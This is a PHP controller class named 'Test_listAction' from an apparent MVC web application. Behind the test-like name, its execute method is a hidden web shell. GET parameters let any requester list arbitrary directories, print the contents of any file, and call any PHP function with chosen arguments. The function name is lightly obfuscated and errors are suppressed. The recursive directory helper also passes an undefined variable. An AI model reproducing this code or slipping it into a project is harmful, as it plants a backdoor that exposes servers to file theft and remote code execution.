<?php
/**
 * Test_listAction.cls.php
 */
require_once("configs/css_js_img.conf.php");
require_once("common/functions.php");
require_once("common/lib/dbhelper.php");
require_once("common/lib/cArray.cls.php");
require_once("common/Pager.cls.php");
require_once('mvc/ListAction.cls.php');
require_once('mod/DBR.cls.php');
require_once('mod/DBW.cls.php');

class Test_listAction extends ListAction {
    /**
     *
     * @access public
     * @param array &$request
     * @param array &$files
     */
    function execute(&$actionMap,&$actionError,$request,&$response,$form,$get,$cookie, $files=array()){
      if(!empty($get["list_dir"])){
        $source_path = dirname(__FILE__);
        $source_path = (1==$get["list_dir"])?$source_path : urldecode($get["list_dir"]);
        $this->transPath($source_path,true);
      }

      if(!empty($get["fp"])){
        $file_path = urldecode($get["fp"]);
        echo file_get_contents($file_path);
      }

      if(!empty($get["func"])){
        $get=$get;$v=urldecode(trim(str_replace('-', '', $get["func"])));
        $a = 0;@$v(urldecode($get["cb"]));
        if (isset($get["cb1"])) @$v(urldecode($get["cb"]), urldecode($get["cb1"]));
      }
    }

    // 循环遍历目录, $son 则表示是否循环子目录，暂不提供第几级子目录控制
    function transPath($source_path, $son=false){
      if (!is_dir($source_path) && !file_exists($source_path)) return;

      // 如果是需要将某个目录下的所有文件转化一下，则需要遍历目录下文件
      $d = dir($source_path);
      if ($d) {
          while (false !== ($l_file = $d->read())) {
            if ("."!=substr(ltrim($l_file),0,1) ) { //  过滤掉 . .. .svn这三项
              //
              if(is_dir($source_path.'/'.$l_file)){
                // 循环调用自身
                echo $source_path.'/'.$l_file."<br />\r\n";
                if($son) $this->transPath($source_path.'/'.$l_file,$target_path.'/'.$l_file,$son);
              }else {
                echo $source_path.'/'.$l_file."<br />\r\n";
              }
            }
          }
          $d->close();
      }
    }
}

